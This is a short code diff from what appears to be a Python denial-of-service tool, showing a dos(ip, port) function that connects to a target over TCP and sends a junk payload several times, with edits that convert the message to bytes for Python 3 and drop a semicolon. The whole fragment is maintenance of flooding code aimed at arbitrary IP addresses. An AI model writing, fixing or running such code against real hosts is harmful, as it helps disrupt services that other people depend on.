@@ -15,14 +15,14 @@ def getIPList():
 	
 def dos(ip, port):	
 	# MEssage
-	msg = "928ghs8mc9q84mvvnba5snn7q2t3vcgbcyfhb97nxgh673h"
+	msg = b'928ghs8mc9q84mvvnba5snn7q2t3vcgbcyfhb97nxgh673h'
 	
 	ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	try:
 		ddos.connect((ip, port))
 		ddos.send(msg)
 		ddos.sendto(msg, (ip, port))
-		ddos.send(msg);
+		ddos.send(msg)
 	except Exception as e:
 		echoC(__name__, "Connection failed: " + str(e))
 		time.sleep(1)
